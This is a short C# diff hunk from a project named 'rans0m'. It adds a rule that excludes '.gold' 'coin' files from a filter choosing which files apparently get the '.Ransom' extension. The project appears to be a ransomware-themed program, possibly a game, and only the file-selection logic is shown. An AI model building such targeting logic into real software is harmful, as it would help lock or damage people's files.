@@ -293,6 +293,9 @@ namespace rans0m
                             if (!string.IsNullOrEmpty(exePath) && f.Equals(exePath, StringComparison.OrdinalIgnoreCase)) return false;
                             // Skip already .Ransom files
                             if (f.EndsWith(".Ransom", StringComparison.OrdinalIgnoreCase)) return false;
+                            // Skip our hidden coin data files - renaming them would
+                            // break collection (the overlay popup is the coin).
+                            if (f.EndsWith(".gold", StringComparison.OrdinalIgnoreCase)) return false;
                             // Skip desktop.ini
                             if (name.Equals("desktop.ini", StringComparison.OrdinalIgnoreCase)) return false;
                             return true;
